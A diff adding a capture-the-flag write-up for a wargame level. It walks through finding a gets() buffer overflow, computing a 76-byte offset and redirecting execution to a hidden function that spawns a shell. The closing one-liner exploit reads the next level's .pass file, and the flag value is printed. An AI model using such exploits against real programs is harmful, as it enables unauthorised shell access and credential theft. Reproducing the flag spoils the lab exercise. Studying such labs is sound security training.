@@ -1,0 +1,48 @@
+ ▄▄▄▄                                    ▄▄▄▄                  ▄▄▄
+ ▀▀██                                    ▀▀██                 █▀██
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                   ██
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                   ██
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                   ██
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▄▄▄██▄▄▄
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀             ▀▀▀▀▀▀▀▀
+
+objdump -d level1
+
+There are two functions: <main> and <run>.
+
+When we look at a disassembly of <main> with radare2:
+
+r2 ./level1
+aaa
+s main
+pdf # (or pdc, or pds)
+
+We see thant run is never called.
+This function is making a call to <system>.
+We can suppose that this function is running the new shell.
+So we just have to make the program calls this function.
+
+The main function makes a call to gets, let's overflow the buffer:
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+gdb level1
+run
+Enter the overflow string
+> 0x63413563 in ?? ()
+Copy the register value (0x63413563) into the website.
+This gives us the offset 76 !
+
+Now, get the address of the "run" function:
+info function run
+> 0x08048444  run
+
+Reverse it (Little Endian):
+44 84 04 08
+
+Write 76 random characters to pass the offset, then write the address of the run function.
+
+python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/f && cat /tmp/f - | ./level1
+cd ../level2 && cat .pass
+
+> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
